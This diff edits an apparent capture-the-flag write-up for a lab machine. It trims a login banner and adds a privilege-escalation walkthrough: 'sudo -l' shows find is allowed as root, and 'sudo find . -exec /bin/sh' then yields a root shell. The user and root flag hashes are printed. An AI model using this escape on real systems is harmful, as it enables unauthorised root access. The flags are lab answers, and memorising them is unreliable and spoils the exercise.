@@ -489,34 +489,34 @@ $ ssh john@10.129.95.184
 john@10.129.95.184's password: 
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun Aug 25 01:12:32 UTC 2024
-
-  System load:  0.08              Processes:             111
-  Usage of /:   62.6% of 2.83GB   Users logged in:       0
-  Memory usage: 8%                IP address for ens160: 10.129.95.184
-  Swap usage:   0%
-
-
-10 updates can be applied immediately.
-8 of these updates are standard security updates.
-To see these additional updates run: apt list --upgradable
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-
 john@base:~$ ls
 user.txt
 john@base:~$ cat user.txt 
 f54846c258f3b4612f78a819573d158e
 ```
 
+`sudo -l` to list the allowed (and forbidden) commands for the invoking user.
+```
+john@base:/$ sudo -l
+[sudo] password for john: 
+Matching Defaults entries for john on base:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User john may run the following commands on base:
+    (root : root) /usr/bin/find
+```
 
+`find` can be used to [break out](/Methodology_and_Resources/GTFOBins.md) and escalate privileges pretty easily: 
+```
+john@base:/$ sudo find . -exec /bin/sh \; -quit
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+51709519ea18ab37dd6fc58096bea949
+```
 
 
 
